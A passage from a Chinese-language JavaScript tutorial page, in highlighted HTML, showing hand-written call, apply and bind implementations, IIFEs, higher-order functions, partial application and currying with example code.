  <span class="token keyword">let</span> fn <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  context<span class="token punctuation">[</span>fn<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span>
  <span class="token keyword">const</span> res<span class="token operator">=</span>context<span class="token punctuation">[</span>fn<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">...</span>parameter<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">delete</span> context<span class="token punctuation">[</span>fn<span class="token punctuation">]</span> <span class="token comment">//delete context.fn</span>
  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>

<span class="token comment">//使用</span>
<span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;samy&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token parameter">age<span class="token punctuation">,</span> sex</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
sayHi<span class="token punctuation">.</span><span class="token function">newApply</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span><span class="token punctuation">[</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//samy 20 男</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><p>call 和 apply 封装对比:<strong>其实核心代码是一样的, 只不过 call 需要对第二个形参解构</strong></p> <p>不用 <code>Symbol</code>判断严谨点的写法：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">call</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">content <span class="token operator">=</span> window</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 判断是否是underfine和null</span>
    <span class="token comment">// if(typeof content === 'undefined' || typeof content === null){</span>
    <span class="token comment">//     content = window</span>
    <span class="token comment">// }</span>
    content<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> result <span class="token operator">=</span> content<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">delete</span> content<span class="token punctuation">.</span>fn<span class="token punctuation">;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">apply</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">content <span class="token operator">=</span> window</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    content<span class="token punctuation">.</span>fn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token comment">//要点；</span>
    <span class="token keyword">let</span> result<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// 判断是否有第二个参数</span>
        result <span class="token operator">=</span> content<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token operator">...</span>arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//因这个方式的参数是一个默认的，得切割剩下的；</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        result <span class="token operator">=</span> content<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">delete</span> content<span class="token punctuation">.</span>fn<span class="token punctuation">;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>bind部分</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//ES6的实现方式;【推荐这种简单的写法】</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">newBind</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">context<span class="token punctuation">,</span><span class="token operator">...</span>innerArgs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//这原理是正确的要考虑两种参数；</span>
  <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span> <span class="token comment">//要点一；</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>finnalyArgs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">self</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span><span class="token operator">...</span>innerArgs<span class="token punctuation">,</span><span class="token operator">...</span>finnalyArgs<span class="token punctuation">)</span><span class="token comment">////要点二；最简单的实现；</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">//使用</span>
<span class="token keyword">let</span> person <span class="token operator">=</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> <span class="token string">'samy'</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">sayHi</span><span class="token punctuation">(</span><span class="token parameter">age<span class="token punctuation">,</span>sex</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> age<span class="token punctuation">,</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> personSayHi <span class="token operator">=</span> sayHi<span class="token punctuation">.</span><span class="token function">newBind</span><span class="token punctuation">(</span>person<span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">)</span>
<span class="token function">personSayHi</span><span class="token punctuation">(</span><span class="token string">'男'</span><span class="token punctuation">)</span>

<span class="token comment">//对象bind 方法的模拟; 应用apply的实现；这个没有考虑第二次传参过来。完整的非ES6版本参考上面；</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">bind</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">context</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//借助call的实现；</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">//var allArgs = args.concat([].slice.call(arguments))</span>
        <span class="token keyword">return</span> <span class="token function">self</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">//简单版本实现；</span>
<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">myBind</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">that</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> <span class="token keyword">this</span> <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Error'</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">const</span> _fn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">_fn</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>that<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br></div></div><p><strong>考虑到原型链</strong>：因为在new 一个bind过生成的新函数的时候，必须的条件是要继承原函数的原型；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">bind</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> arg<span class="token operator">=</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> context<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token function-variable function">bound</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">newArg</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        arg<span class="token operator">=</span>arg<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>newArg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">context</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//添加了这一步；</span>
    <span class="token keyword">var</span> <span class="token function-variable function">F</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
    <span class="token class-name">F</span><span class="token punctuation">.</span>prototype<span class="token operator">=</span>context<span class="token punctuation">.</span>prototype<span class="token punctuation">;</span><span class="token comment">//这里需要一个寄生组合继承</span>
    bound<span class="token punctuation">.</span>prototype<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> bound<span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h4 id="_6-特殊形式的函数"><a href="#_6-特殊形式的函数" class="header-anchor">#</a> 6:特殊形式的函数</h4> <h5 id="回调函数"><a href="#回调函数" class="header-anchor">#</a> 回调函数</h5> <p>回调是一个函数，<strong>它作为参数传递给另一个函数，并在其父函数完成后执行</strong>;</p> <p>也是处理异步的一种方式;  <strong>异步编程进化史：callback -&gt; promise -&gt; generator -&gt; async/await，事件监听，发布订阅；</strong></p> <h5 id="自调函数-iife"><a href="#自调函数-iife" class="header-anchor">#</a> 自调函数(IIFE)</h5> <p><code>IIFE</code>是一个立即调用的函数表达式，它在创建后立即执行;</p> <p>常常使用此模式来避免污染全局命名空间，因为在<code>IIFE</code>中使用的所有变量(与任何其他普通函数一样)在其作用域之外都是不可见的。</p> <h5 id="void-无返回函数"><a href="#void-无返回函数" class="header-anchor">#</a> void 无返回函数</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> foo <span class="token operator">=</span> <span class="token keyword">void</span> <span class="token keyword">function</span> <span class="token function">bar</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//如果IIFE 函数有返回值，则不能使用它</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'samy z'</span><span class="token punctuation">)</span><span class="token comment">//samy z</span>
    <span class="token keyword">return</span> <span class="token string">'foo'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h5 id="内部-私有-函数"><a href="#内部-私有-函数" class="header-anchor">#</a> 内部(私有)函数</h5> <ul><li>确保全局名字空间得纯净性，防止命名冲突；</li> <li>私有性之后我们就可以选择只将一些必要的函数暴露给外部，并保留属于自己的函数，使其不被其他应用程序所调用；</li></ul> <p><img src="/rat-summ/assets/img/18-15-01.12acab7c.jpg" alt=""></p> <h5 id="闭包-返回函数的函数"><a href="#闭包-返回函数的函数" class="header-anchor">#</a> 闭包-返回函数的函数</h5> <p>重写自己的函数；Js内置函数构造器创建函数 <img src="/rat-summ/assets/img/18-15-43.4a5eeb90.jpg" alt="img"></p> <h4 id="_7-高阶函数"><a href="#_7-高阶函数" class="header-anchor">#</a> 7:高阶函数</h4> <blockquote><p>**定义：**函数的参数是函数或返回函数</p></blockquote> <h5 id="常见的高阶函数"><a href="#常见的高阶函数" class="header-anchor">#</a> 常见的高阶函数</h5> <p>像数组的<code>map、reduce、filter</code>这些都是高阶函数；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 简单的高阶函数</span>
<span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> f</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">f</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">f</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//用代码验证一下：</span>
<span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> Math<span class="token punctuation">.</span>abs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 11</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><h5 id="函数式编程"><a href="#函数式编程" class="header-anchor">#</a> 函数式编程</h5> <p>函数式编程是一种&quot;编程范式&quot;; <strong>把运算过程尽量写成一系列嵌套的函数调用;</strong></p> <p>比如:  普通的 (1+2) *3 可以写成multiply(add(1,2), 3)</p> <h5 id="偏函数"><a href="#偏函数" class="header-anchor">#</a> 偏函数</h5> <p><strong>定义</strong>:指定部分参数来返回一个新的定制函数的形式;  <strong>创造了一个新函数，同时将部分参数替换成特定值</strong>。</p> <p><strong>使用场景</strong>：当我们有一个非常通用的函数，并且想要方便地获取它的特定变体，偏函数也是非常有用。</p> <p>举个例子，我们拥有函数<code>post(signature, api, data)</code>。在调用请求方法的时候有着相同的用户签名，这里我们想要使用它的偏函数变体：<code>post(api, data)</code>，表明该请求发送自同一用户签名。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 我们创建了一个做 乘法运算 的函数</span>
<span class="token keyword">function</span> <span class="token function">mult</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> a <span class="token operator">*</span> b<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> double <span class="token operator">=</span> <span class="token function">mult</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//mult.bind(null, 2) 创造了一个新函数 double，传递调用到mult函数，以null为context，2为第一个参数。其他参数等待传入。</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// mult(2, 3) = 6;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">double</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// mult(2, 4) = 8;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><p><code>fn(a,b,c,d)=&gt;fn(a)(b)(c)(d)</code></p> <p>将函数与其参数的一个子集绑定起来后返回个新函数。柯里化后发现函数变得更灵活，更流畅，是<strong>一种简洁的实现函数委托的方式</strong></p> <p>定义:只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数;</p> <h5 id="柯里化"><a href="#柯里化" class="header-anchor">#</a> 柯里化</h5> <p>定义:只传递给函数一部分参数来调用它，让它返回一个函数去处理剩下的参数;</p> <p>将函数与其参数的一个子集绑定起来后返回个新函数。柯里化后发现函数变得更灵活，更流畅，是<strong>一种简洁的实现函数委托的方式</strong></p> <p><code>fn(a,b,c,d)=&gt;fn(a)(b)(c)(d)</code></p> <h6 id="好处"><a href="#好处" class="header-anchor">#</a> 好处</h6> <ul><li><strong>1、参数复用</strong>；<em>正则验证字符串</em>；</li> <li><strong>2、延迟执行</strong>；其实<code>Function.prototype.bind</code>就是科里化的实现例子</li></ul> <h6 id="自定义实现"><a href="#自定义实现" class="header-anchor">#</a> 自定义实现</h6> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//自己实现currying</span>
<span class="token keyword">function</span> <span class="token function">currying</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token function">curried</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">&lt;</span> fn<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//得到一个偏函数，递归carried方法，直到获得所有参数后，直接执行</span>
           <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              <span class="token keyword">return</span> <span class="token function">curried</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>args2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这个合并操作要放在判断前处理；</span>
           <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment">//否则 传入的实参长度 &gt;= 初始函数形参长度 的时候，则直接执行初始函数</span>
          <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> a <span class="token operator">+</span> b <span class="token operator">+</span> c<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> curriedSum <span class="token operator">=</span> <span class="token function">currying</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 常规调用</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">curriedSum</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 6</span>
<span class="token comment">// 得到 curriedSum(1)的偏函数，然后用另外两个参数调用它</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">curriedSum</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 6</span>
<span class="token comment">// 完全柯里化调用</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span> <span class="token function">curriedSum</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 6</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h6 id="柯里化与-bind"><a href="#柯里化与-bind" class="header-anchor">#</a> 柯里化与 bind</h6> <p><strong>bind的实现</strong>； 柯里化就是在bind的基础上加了个遍历循环到参数一致时，才处理；<strong>其实 <code>bind</code> 方法就是一个柯里化转换函数</strong>； <strong>只是这个转换函数没有那么复杂，没有进行参数拆分，而是函数在调用的时候传入了所有的参数</strong>。</p> <blockquote><p>let bound = func.bind(context, arg1, arg2, ...);</p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// bind 方法的模拟</span>
<span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">bind</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">context</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> self <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">self</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> <span class="token function-variable function">currying</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">fn</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//args为[&quot;https&quot;, &quot;www.bing.com&quot;]</span>
    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> newArgs <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//[ 'myfile.js' ]</span>
        <span class="token comment">//newArgs为[&quot;https&quot;, &quot;www.bing.com&quot;, &quot;myFile.js&quot;]</span>
        <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> newArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//相当于return simpleURL(&quot;https&quot;, &quot;www.bing.com&quot;, &quot;myFile.js&quot;);</span>
